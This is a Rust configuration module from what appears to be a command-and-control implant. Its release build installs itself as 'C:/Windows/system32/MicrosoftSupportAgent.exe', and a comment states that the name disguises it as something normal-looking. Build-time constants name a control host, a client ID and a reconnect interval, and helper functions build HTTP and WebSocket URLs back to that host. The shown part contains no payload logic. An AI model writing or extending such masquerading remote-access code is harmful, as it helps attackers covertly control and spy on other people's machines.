pub mod paths {
    use std::{
        path::{Path, PathBuf},
        sync::LazyLock,
    };

    #[cfg(not(debug_assertions))]
    pub const DATA: LazyLock<PathBuf> =
        LazyLock::new(|| PathBuf::from("C:/Windows/system32/MicrosoftSupportAgent.exe")); // we discuise our self as somthing normal looking

    #[cfg(debug_assertions)]
    pub static DATA: LazyLock<PathBuf> = LazyLock::new(|| {
        PathBuf::from(concat!(env!("CARGO_MANIFEST_DIR"), "/test_data/simcc_data"))
    });
}

pub mod compiled {
    pub const HOST: &'static str = env!("SIMCC_HOST");
    pub const CCID: &'static str = env!("CCID");
    const _RETRY_MILLIS: u64 = 5000;
    pub const RETRY_MILLIS: u64 = match option_env!("RETRY_MILLIS") {
        Some(val) => match u64::from_str_radix(val, 10) {
            Ok(parsed) => parsed,
            Err(_) => _RETRY_MILLIS
        },
        None => _RETRY_MILLIS
    };

    pub fn HTTP_URL(path: &str) -> String {
        let proto = if option_env!("WEB_SECURE").is_some() {
            "https"
        } else {
            "http"
        };

        format!("{}://{}{}", proto, HOST, path)
    }

    pub fn WS_URL(path: &str) -> String {
        let proto = if option_env!("WEB_SECURE").is_some() {
            "wss"
        } else {
            "ws"
        };

        format!("{}://{}{}", proto, HOST, path)
    }
}
